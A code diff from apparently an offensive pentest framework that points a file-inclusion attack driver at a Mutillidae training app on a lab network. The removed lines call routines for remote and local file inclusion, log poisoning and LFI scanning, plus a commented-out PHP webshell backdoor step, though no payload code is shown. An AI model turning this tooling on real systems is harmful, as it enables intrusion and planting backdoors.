@@ -15,46 +15,23 @@ class poc4web extends poc4service{
 
     
     
-    public function poc4web4fi(){
-        $msf = "10.60.10.129";
-        $owasp = $msf;
-        //$owasp = "10.60.10.130";
+    public function poc4web4rfi(){
+        $msf = "10.60.10.130";
+
+        $owasp = "10.60.10.129";
         
         $url = "http://$owasp:80/mutillidae/index.php?page=arbitrary-file-inclusion.php";
         
         $ip = "$owasp";
+        $OS = "linux";
         $eth = $this->ip4eth4target($ip);
         $domain = "hack.vlan";
         $url_fi = new URL($eth,$domain,$url);
         $url_fi->poc($this->flag_poc);
         $url_fi->url4pentest();
-        $url_fi = new PARAM($eth,$domain,$url,"target","10.60.10.1");
+        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php");
         $url_fi->poc($this->flag_poc);
         $url_fi->fi4pentest($OS);
-        exit();
-        //$webshell = new malware4linux($owasp, $url_fi->ip, $url_fi->port_rfi, "$url_fi->dir_tmp/backdoor_php_webshell.php", "");
-        //$webshell->backdoor_com_webshell_php();
-        
-        $this->gtitre("Remote File Inclusion");
-        $url_fi->fi_rfi();
-        $this->pause();
-        
-        $this->gtitre("Local File Inclusion");
-        $url_fi->fi_directoryTraversal();$this->pause();
-        $url_fi->fi_log_ssh();$this->pause();
-        $url_fi->fi_phpFilter();$this->pause();
-        $url_fi->fi_phpSession();$this->pause();
-        $url_fi->fi_log_apache();$this->pause();
-        $url_fi->fi_log_smtp();$this->pause();
-        $url_fi->fi_upload();$this->pause();
-        $url_fi->fi_userAgent();$this->pause();
-        $this->ssTitre("Dorks RFI");
-        $this->requette("gedit $this->dir_tools/web/lfi.lst");
-        $this->pause();
-        $url_fi->fi_bypassRestriction();$this->pause(); // Not yet
-        $url_fi->fi_scanLFI($this->msf);$this->pause();
-        $url_fi->fi_contre();$this->pause();
-        $this->notify("END File Inclusion");
     }
     
     
